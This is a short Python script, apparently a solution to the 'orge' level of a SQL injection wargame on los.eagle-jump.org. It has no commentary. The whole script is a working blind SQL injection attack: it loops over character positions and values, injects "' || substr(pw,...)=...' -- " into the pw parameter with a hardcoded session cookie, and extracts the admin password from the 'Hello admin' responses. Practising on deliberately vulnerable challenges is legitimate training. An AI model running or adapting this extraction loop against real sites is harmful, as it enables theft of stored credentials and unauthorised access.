import requests

password=''
for admin_len in range(9) :
    for admin_pass in range(ord('0'),ord('z')) :
        URL='http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?'
        query={'pw': '\' || substr(pw,1,'+str(admin_len+1)+')=\''+password+chr(admin_pass)+'\' -- '}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            password=password+chr(admin_pass)
            print(password)
            break
    print("one cycle complete")